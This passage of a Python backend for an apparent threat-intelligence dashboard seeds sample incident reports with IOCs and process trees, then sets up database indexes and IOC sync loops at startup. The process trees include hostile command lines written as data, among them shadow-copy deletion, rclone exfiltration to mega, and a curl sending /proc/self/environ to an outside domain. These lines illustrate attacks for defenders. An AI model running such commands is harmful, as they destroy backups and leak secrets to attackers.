            "name": "update.exe", "pid": "4120", "cmd": "update.exe /silent", "malicious": False,
            "children": [
                {"name": "rundll32.exe", "pid": "5188", "cmd": "rundll32 loader.dll,Start", "malicious": True, "children": [
                    {"name": "powershell.exe", "pid": "6012", "cmd": "-enc SQBFAFgA...", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Akira Ransomware Exploiting VPN Zero-Day",
        "summary": "Affiliate leveraged an unpatched VPN appliance to gain a foothold, disabled EDR, and detonated ransomware across the domain within 6 hours of intrusion.",
        "severity": "critical",
        "category": "Ransomware",
        "threat_actor": "Akira",
        "image_url": "https://images.unsplash.com/photo-1644088379091-d574269d422f?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Initial Access", "Credential Access", "Lateral Movement", "Defense Evasion", "Impact"],
        "iocs": ["sha256:1a77...ff03", "ext:.akira", "ip:185.156.72.14"],
        "process_tree": {
            "name": "svchost.exe", "pid": "980", "cmd": "svchost -k netsvcs", "malicious": False,
            "children": [
                {"name": "cmd.exe", "pid": "2210", "cmd": "vssadmin delete shadows /all", "malicious": True, "children": [
                    {"name": "akira.exe", "pid": "3320", "cmd": "akira.exe -p C:\\", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "AI-Generated Phishing Kit Targeting Fintech",
        "summary": "LLM-crafted lures with pixel-perfect cloned login portals harvested MFA tokens via reverse-proxy (AiTM). NivX AI classifier flagged anomalous domain entropy.",
        "severity": "high",
        "category": "Phishing / AiTM",
        "threat_actor": "Storm-1101 (cluster)",
        "image_url": "https://images.unsplash.com/photo-1680992046626-418f7e910589?crop=entropy&cs=srgb&fm=jpg&q=85&w=1200",
        "attack_chain": ["Reconnaissance", "Resource Development", "Initial Access", "Credential Access"],
        "iocs": ["domain:secure-fintech-login[.]com", "url:/auth/relay", "ja3:e7d705a3..."],
        "process_tree": {
            "name": "chrome.exe", "pid": "7788", "cmd": "chrome --app=https://phish", "malicious": False,
            "children": [
                {"name": "relay-proxy", "pid": "8090", "cmd": "evilginx2", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Scattered Spider Help-Desk Social Engineering",
        "summary": "Threat actor impersonated employees to a service desk, reset MFA, and pivoted to cloud identity provider. NivX identity analytics flagged impossible-travel sign-ins minutes before privilege escalation.",
        "severity": "critical",
        "category": "Identity / Social Engineering",
        "threat_actor": "Scattered Spider (UNC3944)",
        "actor_slug": "scattered-spider",
        "image_url": "https://images.pexels.com/photos/5380664/pexels-photo-5380664.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Reconnaissance", "Initial Access", "Privilege Escalation", "Lateral Movement", "Collection", "Exfiltration"],
        "iocs": ["ip:104.28.246.11", "email:it-support@nivx-helpdesk[.]com", "ua:Mozilla/5.0 (okta-bypass)"],
        "process_tree": {
            "name": "okta-session", "pid": "-", "cmd": "MFA reset via help desk", "malicious": True,
            "children": [
                {"name": "aws-cli", "pid": "3011", "cmd": "aws sts assume-role", "malicious": True, "children": [
                    {"name": "s3-sync", "pid": "3044", "cmd": "aws s3 sync s3://crown-jewels ./", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "LockBit Affiliate Double-Extortion Campaign",
        "summary": "Initial access broker sold RDP creds; affiliate exfiltrated 400GB before encryption. NivX MDR isolated 3 hosts and blocked the exfil channel, containing spread to 4% of the estate.",
        "severity": "critical",
        "category": "Ransomware",
        "threat_actor": "LockBit 3.0 affiliate",
        "actor_slug": "lockbit",
        "image_url": "https://images.pexels.com/photos/60504/security-protection-anti-virus-software-60504.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Initial Access", "Discovery", "Lateral Movement", "Collection", "Exfiltration", "Impact"],
        "iocs": ["sha256:c9d3...81be", "ext:.lockbit", "ip:193.201.9.55", "tool:rclone.exe"],
        "process_tree": {
            "name": "mstsc.exe", "pid": "1120", "cmd": "RDP session (stolen creds)", "malicious": True,
            "children": [
                {"name": "rclone.exe", "pid": "2288", "cmd": "rclone copy C:\\ mega:exfil", "malicious": True, "children": []},
                {"name": "lockbit.exe", "pid": "2290", "cmd": "lockbit -encrypt -spread", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Malicious npm Package Backdoors CI Pipeline",
        "summary": "A typosquatted dependency executed a postinstall script that exfiltrated CI secrets and planted a build-time backdoor. NivX SCA blocked the package hash across all pipelines.",
        "severity": "high",
        "category": "Supply Chain / DevSecOps",
        "threat_actor": "Unattributed",
        "image_url": "https://images.pexels.com/photos/11035380/pexels-photo-11035380.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Resource Development", "Initial Access", "Execution", "Credential Access", "Exfiltration"],
        "iocs": ["npm:reqwest-utils@1.2.9", "domain:collect-metrics[.]dev", "sha256:44af...9c02"],
        "process_tree": {
            "name": "node", "pid": "512", "cmd": "npm install", "malicious": False,
            "children": [
                {"name": "sh", "pid": "540", "cmd": "node postinstall.js", "malicious": True, "children": [
                    {"name": "curl", "pid": "551", "cmd": "curl -d @/proc/self/environ collect-metrics.dev", "malicious": True, "children": []}
                ]}
            ]
        },
        "source": "NivX Threat Intel",
    },
    {
        "title": "Volt Typhoon Living-off-the-Land in OT Network",
        "summary": "State actor used only built-in tools (LOLBins) to persist in critical-infrastructure OT for months. NivX behavioral analytics surfaced anomalous wmic and netsh usage from a jump host.",
        "severity": "high",
        "category": "APT / Critical Infrastructure",
        "threat_actor": "Volt Typhoon",
        "actor_slug": "volt-typhoon",
        "image_url": "https://images.pexels.com/photos/2881229/pexels-photo-2881229.jpeg?auto=compress&cs=tinysrgb&w=1200",
        "attack_chain": ["Initial Access", "Persistence", "Defense Evasion", "Discovery", "Lateral Movement"],
        "iocs": ["ip:45.32.174.20", "lolbin:wmic.exe", "lolbin:netsh.exe", "cred:cached NTLM"],
        "process_tree": {
            "name": "wmiprvse.exe", "pid": "760", "cmd": "wmic process call create", "malicious": True,
            "children": [
                {"name": "netsh.exe", "pid": "812", "cmd": "netsh interface portproxy add", "malicious": True, "children": []}
            ]
        },
        "source": "NivX Threat Intel",
    },
]


async def seed_threats():
    for t in SAMPLE_THREATS:
        existing = await db.threat_reports.find_one({"title": t["title"]})
        if existing is None:
            report = ThreatReport(**t)
            await db.threat_reports.insert_one(report.model_dump())
        elif t.get("actor_slug") and not existing.get("actor_slug"):
            # Backfill FK on docs seeded before ThreatBox launched.
            await db.threat_reports.update_one(
                {"title": t["title"]},
                {"$set": {"actor_slug": t["actor_slug"], "updated_at": now_iso()}},
            )
    logger.info("Threat reports seeded/verified (ThreatBox FK backfilled)")


@app.on_event("startup")
async def startup():
    await db.users.create_index("email", unique=True)
    await db.app_settings.create_index("key", unique=True)
    # IOC storage hygiene — indexes for fast lookup + TTL auto-purge of stale
    # auto-added IOCs so URLhaus/CINS-Army syncs never grow the DB unboundedly.
    try:
        await db.iocs.create_index("key")
        await db.iocs.create_index([("type", 1), ("key", 1)])
        # TTL on `expires_at` — only auto-added docs will get this field, so
        # manually-curated IOCs live forever regardless of the index.
        await db.iocs.create_index("expires_at", expireAfterSeconds=0)
    except Exception as e:
        logger.warning(f"IOC index setup: {e}")
    await _load_settings_from_db()  # DB-first override for API keys (survives server migration)
    await seed_admin()
    await _seed_actors()
    await seed_threats()
    if OTX_API_KEY:
        asyncio.create_task(_otx_sync_loop())
        logger.info("AlienVault OTX sync loop scheduled (startup + daily)")
    # Bulk-IOC sources (HA/AbuseIPDB/MalwareBazaar/Malwarebytes/VT/Talos) refresh every 2h
    asyncio.create_task(_bulk_ioc_sync_loop())
    logger.info(f"Bulk-IOC sync loop scheduled every {BULK_IOC_SYNC_INTERVAL_SEC//3600}h")


@app.on_event("shutdown")
async def shutdown_db_client():
    client.close()
